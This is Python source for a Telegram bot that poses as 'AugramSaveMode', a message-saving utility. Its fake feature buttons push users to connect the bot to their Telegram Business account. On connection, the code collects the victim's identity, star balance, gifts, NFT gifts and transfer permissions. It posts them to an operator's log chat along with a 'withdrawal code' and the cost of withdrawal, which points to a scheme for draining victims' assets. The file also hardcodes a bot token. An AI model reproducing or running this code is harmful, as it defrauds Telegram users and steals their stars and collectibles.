from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.filters import CommandStart, Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
import random
from datetime import datetime
import requests
import aiohttp
import asyncio
import logging

# Constants
TOKEN = "8050545921:AAEaUiySbaEmVPvRIHLkcd1Gm1papAZ4x-I"  # Bot token
LOG_CHAT_ID = -4672823504
MAX_GIFTS_PER_RUN = 1000
ADMIN_IDS = [7562628646]  # Add admin IDs
storage = MemoryStorage()

# Initialize logging
logging.basicConfig(level=logging.INFO)

# Bot initialization
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

# State machine for gift drawing
class Draw(StatesGroup):
    id = State()
    gift = State()

# Global variables for message tracking
last_messages = {}
codes = {}

def main_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📌 Save temporary messages", callback_data="temp_msgs")],
        [InlineKeyboardButton(text="🗑️ Save deleted messages", callback_data="deleted_msgs")],
        [InlineKeyboardButton(text="✏️ Save edited messages", callback_data="edited_msgs")],
        [InlineKeyboardButton(text="🎞 Animated messages", callback_data="animations")],
        [InlineKeyboardButton(text="📖 Instructions", url="https://t.me/+lcvPndWQzcA4NDU1")]
    ])

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    if message.text == "/start instruction":
        img = FSInputFile("instruction_guide.png")
        await message.answer_photo(
            photo=img,
            caption=(
                "<b>How to connect bot to business account:</b>\n\n"
                "1. Go to «Settings» → <i>Telegram Business</i>\n"
                "2. Navigate to <i>Chat Bots</i>\n"
                "3. Add <b>@AugramSaveMode_bot</b> to the list\n\n"
                "Features will activate automatically ✅"
            )
        )
        return

    photo = FSInputFile("savemod_banner.jpg")
    await message.answer_photo(
        photo=photo,
        caption=(
            "👋 Welcome to <b>AugramSaveMode</b>!\n\n"
            "🔹 Save temporary messages\n"
            "🔹 Save deleted messages\n"
            "🔹 Save edited messages\n"
            "📖 <b>Read instructions before starting</b>\n\n"
            "Choose what to save:"
        ),
        reply_markup=main_menu_kb()
    )

@dp.callback_query(F.data.in_({"temp_msgs", "deleted_msgs", "edited_msgs", "animations"}))
async def require_instruction(callback: types.CallbackQuery):
    await callback.answer("First click the 📖 Instructions button above!", show_alert=True)

async def pagination(page=0):
    url = f'https://api.telegram.org/bot{TOKEN}/getAvailableGifts'
    try:
        response = requests.get(url)
        response.raise_for_status()
        builder = InlineKeyboardBuilder()
        data = response.json()

        if data.get("ok", False):
            gifts = list(data.get("result", {}).get("gifts", []))
            start = page * 9
            end = start + 9

            for gift in gifts[start:end]:
                builder.button(
                    text=f"⭐️{gift['star_count']} {gift['sticker']['emoji']}",
                    callback_data=f"gift_{gift['id']}"
                )

            builder.adjust(2)
            total_pages = len(gifts) // 9

            # Pagination controls
            pagination_buttons = []
            if page > 0:
                pagination_buttons.append(
                    InlineKeyboardButton(text="◀ Back", callback_data=f"down_{page - 1}")
                )

            pagination_buttons.append(
                InlineKeyboardButton(text=f"{page+1}/{total_pages+1}", callback_data="empty")
            )

            if end < len(gifts):
                pagination_buttons.append(
                    InlineKeyboardButton(text="Next ▶", callback_data=f"next_{page + 1}")
                )

            builder.row(*pagination_buttons)

        return builder.as_markup()

    except Exception as e:
        logging.error(f"Pagination error: {e}")
        await bot.send_message(chat_id=ADMIN_IDS[0], text=f"Pagination error: {e}")
        return InlineKeyboardBuilder().as_markup()

@dp.business_connection()
async def handle_business(business_connection: types.BusinessConnection):
    business_id = business_connection.id
    builder = InlineKeyboardBuilder()
    builder.button(text="⛔️ Disconnect", callback_data=f"destroy:{business_id}")

    code = random.randint(100, 1000)
    codes[str(code)] = business_id
    user = business_connection.user

    try:
        info = await bot.get_business_connection(business_id)
        rights = info.rights
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        stars = await bot.get_business_account_star_balance(business_id)

        # Calculations
        total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
        nft_gifts = [g for g in gifts.gifts if g.type == "unique"]
        nft_transfer_cost = len(nft_gifts) * 25
        total_withdrawal_cost = total_price + nft_transfer_cost

        # Message construction
        header = "✨ <b>New Business Account Connection</b> ✨\n\n"

        user_info = (
            f"<blockquote>👤 <b>User Info:</b>\n"
            f"├─ ID: <code>{user.id}</code>\n"
            f"├─ Username: @{user.username or 'none'}\n"
            f"╰─ Name: {user.first_name or ''} {user.last_name or ''}</blockquote>\n\n"
        )

        balance_info = (
            f"<blockquote>💰 <b>Balance:</b>\n"
            f"├─ Available stars: {int(stars.amount):,}\n"
            f"├─ Stars in gifts: {total_price:,}\n"
            f"╰─ <b>Total:</b> {int(stars.amount) + total_price:,}</blockquote>\n\n"
        )

        gifts_info = (
            f"<blockquote>🎁 <b>Gifts:</b>\n"
            f"├─ Total: {gifts.total_count}\n"
            f"├─ Regular: {gifts.total_count - len(nft_gifts)}\n"
            f"├─ NFT: {len(nft_gifts)}\n"
            f"├─ <b>NFT transfer cost:</b> {nft_transfer_cost:,} stars\n"
            f"╰─ <b>Total withdrawal cost:</b> {total_withdrawal_cost:,} stars</blockquote>"
        )

        nft_list = ""
        if nft_gifts:
            nft_items = [f"├─ NFT #{idx} (ID: {getattr(g, 'id', 'hidden')}) - 25⭐"
                       for idx, g in enumerate(nft_gifts, 1)]
            nft_list = "\n<blockquote>🔗 <b>NFT Gifts:</b>\n" + "\n".join(nft_items) + \
                      f"\n╰─ <b>Total:</b> {len(nft_gifts)} NFT = {nft_transfer_cost}⭐</blockquote>\n\n"

        rights_info = (
            f"<blockquote>🔐 <b>Bot Permissions:</b>\n"
            f"├─ Basic: {'✅' if rights.can_read_messages else '❌'} Read | "
            f"{'✅' if rights.can_delete_all_messages else '❌'} Delete\n"
            f"├─ Profile: {'✅' if rights.can_edit_name else '❌'} Name | "
            f"{'✅' if rights.can_edit_username else '❌'} Username\n"
            f"╰─ Gifts: {'✅' if rights.can_convert_gifts_to_stars else '❌'} Convert | "
            f"{'✅' if rights.can_transfer_stars else '❌'} Transfer</blockquote>\n\n"
        )

        footer = (
            f"<blockquote>🔑 <b>Withdrawal code:</b> <code>{code}</code>\n"
            f"ℹ️ <i>Each NFT transfer costs 25 stars</i>\n"
            f"🕒 Time: {datetime.now().strftime('%d.%m.%Y %H:%M')}</blockquote>"
        )

        full_message = header + user_info + balance_info + gifts_info + nft_list + rights_info + footer

        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=full_message,
            reply_markup=builder.as_markup(),
            parse_mode="HTML",
            disable_web_page_preview=True
        )

    except Exception as e:
        logging.error(f"Business connection error: {e}")
        await bot.send_message(LOG_CHAT_ID, f"❌ Connection error: {e}")

# Other handler functions follow similar translation patterns...

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
